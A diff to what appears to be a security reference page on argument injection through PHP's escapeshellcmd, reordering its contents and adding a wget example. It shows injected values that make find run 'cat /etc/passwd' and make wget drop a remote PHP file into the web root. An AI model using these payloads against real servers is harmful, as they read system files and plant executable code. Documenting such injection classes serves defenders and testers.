@@ -30,8 +30,9 @@ We can see by printing the command that all the parameters are splited allowing 
 ## Summary
 
 * [List of exposed commands](#list-of-exposed-commands)
-  * [TAR](#TAR)
   * [CURL](#CURL)
+  * [TAR](#TAR)
+  * [FIND](#FIND)
   * [WGET](#WGET)
 * [References](#references)
 
@@ -79,6 +80,16 @@ Print /etc/passwd content.
 ```php
 $file = "sth -or -exec cat /etc/passwd ; -quit";
 system("find /tmp -iname ".escapeshellcmd($file));
+```
+
+### WGET
+Example of vulnerable code
+```php
+system(escapeshellcmd('wget '.$url));
+```
+Arbitrary file write
+```php
+$url = '--directory-prefix=/var/www/html http://example.com/example.php';
 ```
 
 
